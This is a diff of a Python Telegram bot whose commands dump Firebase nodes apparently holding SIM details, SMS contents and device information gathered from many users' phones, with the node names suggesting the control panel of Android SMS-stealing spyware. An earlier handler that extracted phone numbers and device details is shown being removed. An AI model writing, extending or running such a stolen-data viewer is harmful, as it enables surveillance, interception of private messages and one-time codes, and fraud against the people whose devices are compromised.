@@ -10,49 +10,52 @@ TOKEN = os.getenv("BOT_TOKEN")
 bot = telebot.TeleBot(TOKEN)
 
 
-@bot.message_handler(commands=['start'])
+@bot.message_handler(commands=["start"])
 def start(message):
     bot.reply_to(
         message,
-        "🤖 Firebase Admin Bot\n\n"
-        "/read - Read Full Firebase\n"
-        "/devices - Random Device\n"
-        "/device DEVICE_ID - Read One Device\n"
-        "/messages - Random Message"
+        "🤖 Firebase Bot\n\n"
+        "/sim - SIM Details\n"
+        "/info - Device Info\n"
+        "/sms - SMS Data\n"
+        "/device DEVICE_ID - Device Info"
     )
 
 
-@bot.message_handler(commands=['read'])
-def read(message):
-    data = read_data()
+@bot.message_handler(commands=["sim"])
+def sim(message):
+    data = read_data("All_Users/simDetails")
+
+    if not data:
+        bot.reply_to(message, "❌ No data found")
+        return
+
     bot.reply_to(message, str(data)[:4000])
 
 
-@bot.message_handler(commands=['devices'])
-def devices(message):
-    data = read_data()
+@bot.message_handler(commands=["info"])
+def info(message):
+    data = read_data("All_Users/Data/DeviceInfo")
 
     if not data:
-        bot.reply_to(message, "❌ No devices found")
+        bot.reply_to(message, "❌ No device info")
         return
 
-    keys = [k for k, v in data.items() if isinstance(v, dict)]
+    bot.reply_to(message, str(data)[:4000])
 
-    if not keys:
-        bot.reply_to(message, "❌ No devices found")
+
+@bot.message_handler(commands=["sms"])
+def sms(message):
+    data = read_data("All_Users/sms")
+
+    if not data:
+        bot.reply_to(message, "❌ No SMS found")
         return
 
-    device = random.choice(keys)
-
-    bot.reply_to(
-        message,
-        f"📱 Random Device\n\n"
-        f"🆔 ID: {device}\n\n"
-        f"Use:\n/device {device}"
-    )
+    bot.reply_to(message, str(data)[:4000])
 
 
-@bot.message_handler(commands=['device'])
+@bot.message_handler(commands=["device"])
 def device(message):
     args = message.text.split()
 
@@ -62,57 +65,13 @@ def device(message):
 
     device_id = args[1]
 
-    # Agar devices alag node me hain to is line ko use karo:
-    # data = read_data(f"devices/{device_id}")
-
-    data = read_data(device_id)
+    data = read_data(f"All_Users/Data/DeviceInfo/{device_id}")
 
     if not data:
         bot.reply_to(message, "❌ Device not found")
         return
 
-    number = (
-        data.get("number")
-        or data.get("phoneNumber")
-        or data.get("phone")
-        or data.get("mobile")
-        or "Unknown"
-    )
-
-    model = data.get("model", "Unknown")
-    battery = data.get("battery", "Unknown")
-    version = data.get("version", "Unknown")
-
-    text = (
-        f"📱 Device Details\n\n"
-        f"🆔 ID: {device_id}\n"
-        f"📞 Number: {number}\n"
-        f"📱 Model: {model}\n"
-        f"🔋 Battery: {battery}\n"
-        f"🤖 Version: {version}\n\n"
-        f"{str(data)[:3000]}"
-    )
-
-    bot.reply_to(message, text)
-
-
-@bot.message_handler(commands=['messages'])
-def messages(message):
-    data = read_data("messages")
-
-    if not data:
-        bot.reply_to(message, "❌ No messages found")
-        return
-
-    keys = list(data.keys())
-    msg = random.choice(keys)
-
-    bot.reply_to(
-        message,
-        f"💬 Random Message\n\n"
-        f"🆔 ID: {msg}\n\n"
-        f"{str(data[msg])[:3500]}"
-    )
+    bot.reply_to(message, str(data)[:4000])
 
 
 print("Bot Started...")
